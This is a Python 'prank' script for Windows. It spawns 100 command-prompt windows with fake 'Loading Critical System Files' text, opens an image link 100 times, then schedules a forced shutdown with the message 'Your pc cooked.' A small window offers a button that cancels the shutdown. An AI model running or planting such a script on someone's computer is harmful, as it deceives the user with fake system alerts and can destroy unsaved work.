import os
import time
import threading
import tkinter as tk

message = "Your pc cooked."
delay_seconds = 10
number_of_pranks = 100
chaos_duration = 3

image_url = "https://imgs.search.brave.com/t-Yc0vaEDRHZqisMGcholqWBUX8xbGY-UdYKpM-qRbA/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pLmlt/Z2ZsaXAuY29tLzQv/ZTlkNzAuanBn"

def run_prank():
    print(message)
    print("Initiating Phase 1: Total System Chaos...")

    for i in range(number_of_pranks):
        os.system(f'start cmd /k echo Loading Critical System Files... Window {i+1}')
        os.system(f'start "{image_url}"')
        time.sleep(0.1)

    print(f"Chaos initiated! Waiting {chaos_duration} seconds before execution...")
    time.sleep(chaos_duration)

    print(f"Shutdown in {delay_seconds} seconds...")
    os.system(f'shutdown /s /t {delay_seconds} /c "{message}"')

def stop_shutdown():
    os.system("shutdown /a")
    status.config(text="Shutdown cancelled!")
    print("Shutdown cancelled.")

root = tk.Tk()
root.title("Prank Control")
root.geometry("250x120")

status = tk.Label(root, text="Prank running...")
status.pack(pady=10)

stop_btn = tk.Button(
    root,
    text="STOP SHUTDOWN",
    command=stop_shutdown,
    bg="red",
    fg="white",
    font=("Arial", 12, "bold")
)
stop_btn.pack(pady=10)

threading.Thread(target=run_prank, daemon=True).start()

root.mainloop()
